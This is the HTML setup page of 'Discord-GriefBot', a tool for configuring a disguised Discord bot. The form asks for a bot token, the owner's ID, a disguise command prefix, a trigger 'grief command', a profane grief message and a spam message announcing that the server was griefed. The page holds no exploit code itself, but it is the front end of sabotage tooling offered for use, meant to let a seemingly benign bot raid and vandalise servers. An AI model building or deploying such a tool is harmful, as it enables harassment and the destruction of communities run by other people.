<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE-edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="/css/bootstrap.min.css">
    <link rel="stylesheet" href="/css/main.css">
    <link rel="stylesheet" href="/css/now-ui-kit.css">
    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,600,700,800,900&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,600,700,800,900&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,600,700,800,900&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
        integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
        crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"
        integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1"
        crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
        integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"
        crossorigin="anonymous"></script>
    <script src="/js/now-ui-kit.min.js"></script>
    <script src="/js/connection.js"></script>
    <script src="/js/setup.js"></script>
    <script src="/js/websocket.js"></script>
    <title>Discord-GriefBot · Setup</title>
</head>

<body>
    <nav class="navbar navbar-expand-lg bg-transparent">
        <a href="https://github.com/CorruptedBytes/DiscordGriefBot" target="_blank">
            <h2 style="color: white;">Discord-GriefBot</h2>
        </a>
    </nav>
    <div class="heading">
        <form>
            <center>
                <span>
                    <p>Discord Bot-Token</p>
                    <label><input type="text" name="botToken" id="botToken" placeholder="ODc4MjIwNTE4MjEyMzc4NjU0"
                            spellcheck="false" autocomplete="off" required /></label>
                </span>
                <br /><br />
                <span>
                    <p>Your Discord User ID</p>
                    <label><input type="text" name="userID" id="userID" placeholder="878220518212378654"
                            spellcheck="false" autocomplete="off" required /></label>
                </span>
                <br /><br />
                <span>
                    <p>Activity Description</p>
                    <label><input type="text" name="activityDescription" id="activityDescription" placeholder="Music"
                            spellcheck="false" autocomplete="off" required /></label>
                </span>
                <br /><br />
                <span>
                    <p>Disguise Command Prefix</p>
                    <label><input type="text" name="disguiseCommandPrefix" id="disguiseCommandPrefix" placeholder="!"
                            spellcheck="false" autocomplete="off" required /></label>
                </span>
                <br /><br />
                <span>
                    <p>Grief Command</p>
                    <label><input type="text" name="griefCommand" id="griefCommand" placeholder="%start"
                            spellcheck="false" autocomplete="off" required /></label>
                </span>
                <br /><br />
                <span>
                    <p>Grief Message</p>
                    <label><input type="text" name="griefMessage" id="griefMessage" placeholder="Fucked-by-%s"
                            spellcheck="false" autocomplete="off" required /></label>
                </span>
                <br /><br />
                <span>
                    <p>Spam Message</p>
                    <label><input type="text" name="spamMessage" id="spamMessage"
                            placeholder="YOUR DISCORD SERVER WAS GRIEFED!" spellcheck="false" autocomplete="off"
                            required /></label>
                </span>
                <br /><br />
                <a class="btn btn-primary btn-lg" id="submitBtn" role="button">Submit</a>
            </center>
        </form>
    </div>
    <!-- Copyright © CorruptedBytes - 2022 -->
</body>

</html>
